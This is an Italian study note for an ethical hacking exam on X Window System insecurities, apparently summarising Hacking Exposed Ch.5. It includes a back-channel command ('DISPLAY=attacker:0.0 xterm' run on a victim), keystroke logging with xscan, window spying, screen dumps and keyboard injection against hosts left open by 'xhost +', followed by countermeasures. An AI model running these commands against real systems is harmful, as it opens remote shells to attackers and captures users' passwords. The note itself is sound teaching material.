
## tags: [eth, unix-hacking, back-channel, lateral-movement] capitolo: HE7 Ch.5 collegato: [[rpc_services]], [[nfs_attacks]], [[rlogin_rhosts]], [[command_injection]]

# X Window System — Architettura e Attacchi

## Architettura (invertita rispetto all'intuizione)

X11 ha un modello client-server **controintuitivo**:

|Ruolo X11|Chi è in realtà|Dove gira|
|---|---|---|
|**X server**|gestisce il display fisico|sulla macchina con monitor/tastiera|
|**X client**|applicazione grafica (xterm, browser…)|ovunque in rete|

```
vittima (X server, ha il display)
    ← xterm si connette ←
attaccante (lancia xterm con DISPLAY=vittima:0)
```

Quindi: `DISPLAY=attacker:0.0 xterm` eseguito **dalla vittima** → l'xterm appare **sul desktop dell'attaccante**. Questo è il back channel grafico classico.

Porta di ascolto: `6000 + display_number`

- `:0` → 6000, `:1` → 6001, … `:63` → 6063

---

## `xhost` — Il Problema Root

`xhost` controlla chi può connettersi all'X server. Il modello è **all-or-nothing**: dentro o fuori, nessuna granularità.

```bash
xhost +          # chiunque può connettersi — wildcard totale
xhost +10.0.0.5  # solo questo IP
xhost -          # revoca tutti i permessi (non chiude connessioni attive)
```

`xhost +` è il misconfiguration classico, spesso fatto "per comodità". Su PC-based X server (Exceed, Cygwin/X, ecc.) era il default.

---

## X11 come Back Channel

Con `xhost +` attivo sull'attaccante e shell sulla vittima:

```bash
# sulla vittima
DISPLAY=attacker:0.0 xterm &
# → xterm root-owned appare sul desktop attaccante
```

Usato nel pattern NFS + inetd ([[nfs_attacks]]): script `in.ftpd` che lancia xterm verso attacker, eseguito come root da inetd.

---

## Attacchi con `xhost +` Aperto (senza shell sulla vittima)

### Keystroke Logging — `xscan`

```bash
xscan itchy
# si connette a itchy:6000, loga tutto ciò che l'utente digita
# incluse password durante su / sudo / ssh
```

Output in `KEYLOG.itchy:0.0` — readable in real time con `tail -f`. Nessun exploit, nessuna memory corruption: pura connessione X11 autorizzata.

---

### Window Spying — `xlswins` + `xwatchwin`

```bash
# enumera le finestre aperte sul display remoto
xlswins -display itchy:0.0 | grep -i firefox
# → 0x1000561  (Firefox)

# visualizza quella finestra sul tuo display, in real time, silenziosamente
xwatchwin itchy -w 0x1000561
```

Puoi osservare il browser, il terminale, qualsiasi applicazione grafica della vittima.

---

### Screenshot — `xwd` (richiede shell locale)

```bash
# sulla vittima (hai una shell)
xwd -root -display localhost:0.0 > /tmp/dump.xwd

# sull'attaccante dopo aver copiato il file
xwud -in dump.xwd
```

---

### Keyboard Injection — KeySyms

Puoi inviare eventi tastiera sintetici a qualsiasi finestra X come se fossero digitati fisicamente. Apri un xterm sulla vittima → inietti comandi → vengono eseguiti nel contesto dell'utente loggato.

---

## Riepilogo Capacità con `xhost +`

|Attacco|Tool|Richiede shell?|Impatto|
|---|---|---|---|
|Keystroke logging|`xscan`|No|Password in chiaro|
|Window spying live|`xlswins` + `xwatchwin`|No|Osservazione sessione|
|Screenshot|`xwd`|Sì (locale)|Snapshot display|
|Keyboard injection|KeySyms API|No|Esecuzione comandi|
|Back channel grafico|`xterm -display`|Sì|Shell remota|

---

## Countermeasures

|Meccanismo|Come funziona|Note|
|---|---|---|
|**MIT-MAGIC-COOKIE-1**|Token condiviso in `~/.Xauthority` — client deve presentarlo|Default moderno su Linux|
|**XDM-AUTHORIZATION-1**|Basato su DES|Raro, più forte del cookie|
|**MIT-KERBEROS-5**|Kerberos full|Enterprise only|
|**SSH X11 forwarding**|Tunnela X11 su SSH cifrato|Il modo corretto per X remoto oggi|
|Firewall 6000–6063|Blocca accesso di rete al X server|Prima linea di difesa perimetrale|
|`xhost -`|Revoca tutti i permessi xhost|Non termina sessioni attive|
|`xterm -secure`|Abilita secure keyboard — nessun processo può intercettare i tasti|Solo per xterm locale|

**Regola pratica**: mai `xhost +`. Se serve X remoto → SSH tunnel (`ssh -X` o `ssh -Y`).

---

## TL;DR esame

1. X server = chi ha il display; X client = l'applicazione — architettura invertita
2. `DISPLAY=attacker:0 xterm` dalla vittima → shell grafica sull'attaccante
3. `xhost +` = chiunque può connettersi → keystroke log, window spy, keyboard inject senza exploit
4. Porta 6000+display_number → range 6000–6063 da firewallare
5. Fix moderno: MIT-MAGIC-COOKIE-1 (default Linux) o SSH X11 forwarding

---

## Fonte

HE7 Ch.5 — _X Insecurities_ (pp. da verificare sulla tua copia) Risk rating originale: Popularity 8 / Simplicity 9 / Impact 5 → **Risk 7**